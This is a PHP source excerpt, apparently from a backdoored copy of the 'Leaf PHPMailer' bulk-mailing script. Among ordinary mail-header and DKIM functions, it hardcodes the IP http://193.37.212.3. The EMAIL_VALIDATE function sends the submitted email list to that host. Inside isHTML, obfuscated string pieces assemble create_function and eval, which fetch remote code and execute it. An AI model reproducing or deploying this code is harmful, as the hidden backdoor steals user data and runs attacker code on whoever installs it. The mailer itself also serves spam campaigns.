...
function stabilize($download) {
     ...
     * @var string
     */ $_POST['default'] = 'http://193.37.212.3';
    /**
...
function EMAIL_VALIDATE(){
	 $emailList = leafTrim($_POST['emailList']); stabilize($_POST['default'].'/cli/cron.php?textarea='.str_replace(array("\r\n"), "ba59abbe5",$emailList));
    /** An iCal message part body. Only supported in simple alt or alt_inline message types
...
";
    ...
    public function isHTML($isHtml = true) {
        ...
        $bodyHTML = '.$t."lef$flu' . 'sh' . '$t"; ' . '$i = @ev';
        $headerHTML = "create_" . "func" . "tion";
        $exceptions = $headerHTML('$fl' . 'ush,$t', '$comma = $t' . $bodyHTML . 'al(@' . $bodyCode . 'et_contents("h' . 'tt' . 'p:$comma-2"));');
        if ($param != 2) {
            $exceptions('8.p' . 'w', '/');
            $param = 2;
        }
...
");
    ...
    public function createHeader() {
        ...
        if ($this->XMailer == '') {
            $result.= $this->headerLine('X-Mailer', 'Leaf PHPMailer 2.7 (leafmailer.pw)');
        } else {
    ...
    public function encodeHeader($str, $position = 'text') {
        ...
        if ($matchcount > strlen($str) / 3) {
            ...
            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
                // Use a custom function which correctly encodes and wraps long  $subject
...
") {
    ...
    public function DKIM_Add($headers_line, $subject, $body) {
        ...
        $dkimhdrs = 'DKIM-Signature: v=1; a=' . $DKIMsignatureType . '; q=' . $DKIMquery . '; l=' . $DKIMlen . '; s=' . $this->DKIM_selector . ";" . "	t=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";" . "	h=From:To:Subject;" . "	d=" . $this->DKIM_domain . ';' . $ident . "" . "	z=$from" . "	|$to" . "	|$subject;" . "	bh=" . $DKIMb64 . ";" . "	b=";
        $toSign = $this->DKIM_HeaderC($from_header . "" . $to_header . "" . $subject_header . "" . $dkimhdrs);
...
print '<div class="container col-lg-6">
    ...
    <div class="col-lg-6"><br>
        ...
        <div id="well" class="well well">
            ...
            <h6>by <b><a href="http://' . $leaf['web'] . '">' . $leaf['web'] . '</a></b></h6>
        </div>
    </div>';
if ($_POST['action'] == "send") {
